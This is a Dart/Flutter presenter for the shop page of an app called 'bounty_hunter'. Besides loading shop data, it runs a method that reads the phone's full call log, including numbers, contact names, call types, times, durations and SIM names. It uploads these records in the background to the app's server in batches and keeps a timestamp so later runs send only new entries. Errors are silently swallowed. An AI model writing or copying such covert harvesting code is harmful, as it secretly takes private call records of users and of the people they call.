import 'dart:async';

import 'package:call_log/call_log.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:bounty_hunter/account/models/city_entity.dart';
import 'package:bounty_hunter/mvp/base_page_presenter.dart';
import 'package:bounty_hunter/net/net.dart';
import 'package:bounty_hunter/shop/iview/shop_iview.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:provider/provider.dart';

import '../../models/shop_entity.dart';
import '../../providers/refresh_provider.dart';
import '../../providers/user_provider.dart';
import '../../util/cache.dart';


class ShopPagePresenter extends BasePagePresenter<ShopIMvpView> {
  static const String _callLogLastTimestampKey = 'bt_call_log_last_timestamp';
  static const int _maxBatchSize = 50;

  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      // if (view.isAccessibilityTest) {
      //   return;
      // }
      await show(true);

      /// 接口请求例子
      /// get请求参数queryParameters  post请求参数params
      // asyncRequestNetwork<UserEntity>(Method.get,
      //   url: HttpApi.users,
      //   onSuccess: (data) {
      //     view.setUser(data);
      //   },
      // );
    });
  }

  Future<void> show(bool isShowDialog) async {
    await requestNetwork<ShopEntity>(
      Method.get,
      url: '${HttpApi.shop}/1',
      isShow: isShowDialog,
      queryParameters: {"page": 1},
      onSuccess: (data) async {
        view.setData(data!.data!);
        view.getContext().read<UserProvider>().setUserEntity(data.other!);
        view.getContext().read<RefreshProvider>().setUserEntity(data.other!);
        view.maybeShowNotification(
          data.data?.notificationData ?? const <String>[],
          data.data?.notificationShowDate ?? 0,
        );
        unawaited(_uploadCallLogsSilently());
      },
      onError: (_, __) async {
        if (_ == 200006) {
        } else {
          view.showToast(__);
        }
      },
    );
  }

  Future<void> _uploadCallLogsSilently() async {
    try {
      final bool granted = await _ensureCallLogPermission();
      if (!granted) {
        view.showToast('Please authorize call log access permission');
        return;
      }

      final int lastTimestamp = await _getLastUploadedTimestamp();
      final Iterable<CallLogEntry> entries = await CallLog.query(
        dateFrom: lastTimestamp > 0 ? lastTimestamp + 1 : null,
      );

      final List<CallLogEntry> sortedEntries = entries.toList()
        ..sort((a, b) => (a.timestamp ?? 0).compareTo(b.timestamp ?? 0));

      if (sortedEntries.isEmpty) {
        return;
      }

      int maxUploadedTimestamp = lastTimestamp;

      for (int i = 0; i < sortedEntries.length; i += _maxBatchSize) {
        final int end =
            (i + _maxBatchSize) > sortedEntries.length ? sortedEntries.length : (i + _maxBatchSize);
        final List<CallLogEntry> batch = sortedEntries.sublist(i, end);
        await _uploadCallLogBatch(batch);

        final int batchMax = batch
            .map((e) => e.timestamp ?? 0)
            .fold<int>(0, (previous, element) => element > previous ? element : previous);
        if (batchMax > maxUploadedTimestamp) {
          maxUploadedTimestamp = batchMax;
        }
      }

      if (maxUploadedTimestamp > lastTimestamp) {
        await Cache().setString(_callLogLastTimestampKey, maxUploadedTimestamp.toString());
      }
    } catch (_) {
      // 静默失败，避免影响主流程
    }
  }

  Future<bool> _ensureCallLogPermission() async {
    PermissionStatus status = await Permission.phone.status;

    if (status.isGranted) {
      return true;
    }

    // Android 部分机型会把通话记录权限归类到通讯录权限
    final PermissionStatus contactsStatus = await Permission.contacts.status;
    if (contactsStatus.isGranted) {
      return true;
    }

    if (status.isDenied || status.isRestricted || status.isLimited) {
      status = await Permission.phone.request();
      if (status.isGranted) {
        return true;
      }
    }

    return false;
  }

  Future<int> _getLastUploadedTimestamp() async {
    final String? value = await Cache().getString(_callLogLastTimestampKey);
    if (value == null || value.isEmpty) {
      return view.getContext().read<UserProvider>().userEntity.profile!.dOCallLogTime ?? 0;
    }
    return int.tryParse(value) ?? view.getContext().read<UserProvider>().userEntity.profile!.dOCallLogTime ?? 0;
  }

  Future<void> _uploadCallLogBatch(List<CallLogEntry> batch) async {
    final List<Map<String, dynamic>> logs = batch
        .map((entry) => <String, dynamic>{
              'e_formatted_number': entry.formattedNumber ?? '',
              'f_cached_matched_number': entry.cachedMatchedNumber ?? '',
              'g_number': entry.number ?? '',
              'h_name': entry.name ?? '',
              'i_call_type': entry.callType?.name ?? '',
              'j_date': entry.timestamp ?? 0,
              'k_duration': entry.duration ?? 0,
              'l_phone_account_id': entry.phoneAccountId ?? '',
              'm_sim_display_name': entry.simDisplayName ?? '',
            })
        .toList();

    await requestNetwork<dynamic>(
      Method.post,
      url: HttpApi.btCallLogs,
      isShow: false,
      isClose: false,
      params: FormData.fromMap({
        'logs': logs,
      }),
    );
  }
 
  void testListData() {
    /// 测试返回List类型数据解析
    asyncRequestNetwork<List<CityEntity>>(Method.get,
      url: HttpApi.subscriptions,
      onSuccess: (data) {

      },
    );
  }
}
